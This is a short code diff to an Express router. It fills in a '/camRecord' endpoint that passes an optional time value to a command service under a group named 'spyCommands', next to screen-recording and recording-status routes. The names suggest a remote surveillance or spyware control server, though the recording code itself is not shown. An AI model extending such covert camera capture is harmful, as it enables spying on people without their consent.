@@ -92,11 +92,18 @@ router.post('/notify', function (req, res) {
 })
 
 router.post('/screenRecord', function (req, res) {
-    
 })
 
 router.post('/camRecord', function (req, res) {
-    
+    var options = []
+
+    if (req.body.time != null) {
+        options.push(""+req.body.time)
+    } 
+
+    commandService.execute('spyCommands', 'camRecord', options, function(){
+        res.status(200).send({responseMessage: "camRecord Started"})  
+    })  
 })
 
 router.get('/isRecording', function (req, res) {
